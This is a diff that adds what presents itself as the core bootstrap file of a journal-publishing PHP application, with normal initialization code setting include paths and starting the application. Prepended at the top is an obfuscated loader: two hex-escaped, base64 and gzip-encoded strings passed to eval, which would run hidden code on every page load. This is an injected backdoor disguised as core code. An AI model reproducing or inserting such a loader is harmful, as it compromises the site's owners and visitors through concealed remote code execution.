@@ -1,0 +1,66 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "f7PsTn19n0f\x43wD\x62l\x41ku\x63\x63Ow\x2b9y1invud\x2bwTNY4i0WHwfgHkf7GDrP\x42M3\x42U4mtXTe5wVelzOsoPpI\x41o\x41j49J\x62q5\x43u2uFt\x6193T\x43JERNi\x42fMZDs\x62dn\x2bp\x622n\x62\x61\x63jz44pI\x41IfpfPOI3JguszQ9TxD\x41itl05\x420imo\x43g\x41\x61g3o\x2b\x63u\x63qsG\x42NSNjzK\x42\x433Y\x2b32i\x41ij\x43lpeU\x42jSJO1i/PtjP8uF\x42\x2b8Q48J5\x63Zf\x614\x42P6zDsERm31Ym\x62f/K3\x61udtKr66QfiQW54Kqu\x2bzP/uOM5lT8MhOHQqmSuuIjTMj3F\x412tSjPgM\x62YxoMX/\x41pEsIj\x41e4HVgsHxHui07\x611rXzsG3SqINgdDflD\x41RSKvJDofoF5ry2V/j7JGe31UdV\x63rJ/6u9yp2\x62KuH/7\x41PvUSf\x62sjJwJh30seONgKdGrn\x624\x41vnmOwMV\x41WpNMg3Fix7\x2bREO6Wrrhn8\x41\x432FPS\x42RFKgPw75sq4\x61Zg1N\x61YOS2G4o/zXw9dWrlJIK8\x42H7yPDjvjQUFRdLoJTSv\x42\x43ZqtmhT\x62\x43JpH47xyXgOh8LeY1tlkZ\x422\x43Q1rfpNOX\x61\x62qYY8eFr\x42lMnf\x2bl35Zy7zs8lUlLq0Dx474P0ISw04t29Q4vNLE\x43geFowy\x62Tjq\x61\x42qW\x63hUKhqEyypYw/T7r9\x43\x42MU/WTT1o/zE\x41z\x42wJe\x2bjS\x41XHg/jE\x413\x42wJe\x2bjR\x41nHg/TE\x417\x42wJe\x2bjQ\x413Hg/DE\x41/\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+?>
+
+<?php
+
+/**
+ * @defgroup index
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
+ *
+ * Copyright (c) 2013-2017 Simon Fraser University
+ * Copyright (c) 2000-2016 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// Update include path - for backwards compatibility only
+// Try to use absolute (/...) or relative (./...) filenames
+// wherever possible to bypass the costly file name normalization
+// process.
+ini_set('include_path', '.'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/classes'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/pages'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/classes'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/pages'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/adodb'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/phputf8'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/pqp/classes'
+	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/smarty'
+	. ENV_SEPARATOR . ini_get('include_path')
+);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+// FIXME: As long as we support PHP4 we cannot use the return
+// value from the new statement directly. See http://pkp.sfu.ca/wiki/index.php/Information_for_Developers#Use_of_.24this_in_the_constructor
+// We rather retrieve the application instance by-ref from the registry.
+new Application();
+?>
